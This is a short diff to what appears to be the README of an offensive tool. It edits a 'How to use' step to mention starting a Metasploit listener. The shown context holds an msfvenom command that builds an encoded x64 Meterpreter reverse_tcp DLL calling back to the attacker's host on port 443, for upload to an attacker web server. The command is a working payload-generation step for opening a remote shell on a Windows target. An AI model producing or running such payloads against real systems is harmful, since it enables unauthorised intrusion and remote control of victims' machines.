@@ -13,7 +13,7 @@ In order to execute the required commands, we must open a PowerShell window with
 ```
 
 # How to use
-1. Create a DLL payload using msfvenom and upload it to the attackers web server:
+1. Create a DLL payload using msfvenom and upload it to the attackers web server (_start metasploit listener with same payload parameters_):
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f dll -t 300 -e x64/xor_dynamic -o met.dll
 ```
